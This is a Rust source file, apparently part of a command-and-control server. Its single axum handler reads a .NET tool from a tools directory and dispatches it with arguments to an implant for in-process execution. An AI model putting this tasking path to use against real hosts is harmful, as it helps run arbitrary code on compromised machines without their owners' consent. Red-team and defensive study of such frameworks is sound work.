use std::{path::PathBuf, sync::Arc};

use axum::extract::State;
use serde_json::Value;
use shared::{
    task_types::DotExDataForImplant,
    tasks::{Command, DotExInner},
};

use crate::{TOOLS_PATH, admin_task_dispatch::task_agent, app_state::AppState};

/// Executes dotnet in the current process
pub async fn dotex(
    uid: Option<String>,
    data: DotExInner,
    state: State<Arc<AppState>>,
) -> Option<Value> {
    let mut path_to_tool = PathBuf::from(TOOLS_PATH);
    path_to_tool.push(data.tool_path);

    // Read the tool, ret an error wrapped in an Option if it happens.. I regret this pattern rn
    let tool_data = match tokio::fs::read(path_to_tool).await {
        Ok(f) => f,
        Err(e) => {
            return Some(
                serde_json::to_value(Err::<String, String>(format!("Could not read file. {e}")))
                    .unwrap(),
            );
        }
    };

    let metadata: DotExDataForImplant = (tool_data, data.args);

    let meta_ser = serde_json::to_string(&metadata).unwrap();

    let _ = task_agent(Command::DotEx, Some(meta_ser), uid.unwrap(), state).await;

    None
}
